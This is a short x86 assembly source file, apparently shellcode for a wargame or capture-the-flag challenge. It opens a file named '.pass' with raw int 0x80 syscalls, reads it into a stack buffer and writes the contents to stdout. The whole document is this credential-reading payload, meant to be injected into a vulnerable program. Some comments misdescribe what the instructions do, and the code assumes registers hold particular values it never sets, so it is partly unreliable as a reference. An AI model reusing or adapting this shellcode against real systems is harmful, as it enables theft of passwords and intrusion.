segment .text

global _start

_start:
        ; push hex of ".pass" string on the stack
        push 0x73
        push 0x7361702e

        ; syscall open(ebx, ecx, edx)
        ; open(filename, mode, permission(?))
        mov al, 0x5     ; move to al syscall number
        mov ebx, esp    ; move to ebx filename pointer or esp at which address we have our filename
        xor ecx, ecx    ; move 0 to ecx that will be 0_RDONLY mode
        xor edx, edx    ; move 0 to edx for permissions
        int 0x80        ; interrupt

        ; syscall read(ebx, ecx, edx)
        ; read(fd, buff, buf_size)
        sub esp, 0x64   ; move our esp to begin of the string ".pass"
        mov ebx, eax    ; move file descriptor to ebx
        mov al, 0x3     ; move to al syscall number
        mov ecx, esp    ; move ecx our buffer pointer
        mov dl, 0x64    ; move to edx buffer size
        int 0x80        ; interrupt

        ; syscall write(ebx, ecx, edx)
        ; write(fd, buff, buf_size)
        mov al, 0x4     ; move to al syscall number
        mov bl, 1       ; move to ebx the file descriptor (stdout = 1)
        mov ecx, esp    ; move to ecx our buffer to output
        mov dl, 100     ; move to edx buffer size
        int 0x80        ; interrupt
